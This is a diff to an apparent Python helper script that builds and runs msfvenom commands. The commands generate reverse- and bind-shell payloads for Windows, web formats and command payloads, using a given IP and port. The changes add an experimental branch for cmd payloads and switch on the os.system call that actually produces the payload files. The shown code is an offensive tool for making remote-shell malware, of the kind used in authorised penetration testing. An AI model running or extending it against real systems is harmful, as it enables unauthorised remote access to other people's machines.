@@ -118,15 +118,20 @@ def generate_payload(params,number,avail_payloads):
     K_TYPE ,K_ARCH,K_MET, K_BIND, K_STAGE, K_EXT, K_KEY, IP, PORT = params
     print(params)
     pname = " ".join([K_TYPE, K_ARCH,K_MET, K_BIND,K_STAGE,IP,str(PORT)]).replace(" ","-") # pretify pname
+    pname = "_" + pname # fast trick to remove all payload in dir via rm _*
     print(pname)
     
     HOST = "LHOST" if K_BIND == "reverse" else "RHOST" 
     
     payload_cmd =avail_payloads[number].split()[0]
-          
+    if "cmd/" in payload_cmd:
+        print("[EXPERIMENTAL] Try to process CMD payload..")
+        K_FORMAT = "raw"
+        payload="msfvenom -p {} {}={} LPORT={} -f {} ".format(payload_cmd,HOST, IP,PORT,K_FORMAT)       
+    
     if args.SHELL_TYPE == "web":
-         K_FORMAT = K_EXT if K_EXT != "jsp" else "raw"
-         payload="msfvenom -p {} {}={} LPORT={} -f {} -o {}".format(payload_cmd,HOST, IP,PORT,K_FORMAT, pname + "." + K_EXT)
+        K_FORMAT = K_EXT if K_EXT != "jsp" else "raw"
+        payload="msfvenom -p {} {}={} LPORT={} -f {} -o {}".format(payload_cmd,HOST, IP,PORT,K_FORMAT, pname + "." + K_EXT)
     
     elif K_TYPE == "windows":
         payload="msfvenom -p {} {}={} LPORT={} -f exe -o {}".format(payload_cmd,HOST, IP,PORT,pname+".exe")
@@ -138,7 +143,7 @@ def generate_payload(params,number,avail_payloads):
     print("[*] Generating Payload")
     print("        -> ",payload)
     print("[*] Please wait ...")    
-    #os.system(payload)
+    os.system(payload)
     print(Green("[+] DONE ! Payload has been generated. "))
     
     # Deliver payload
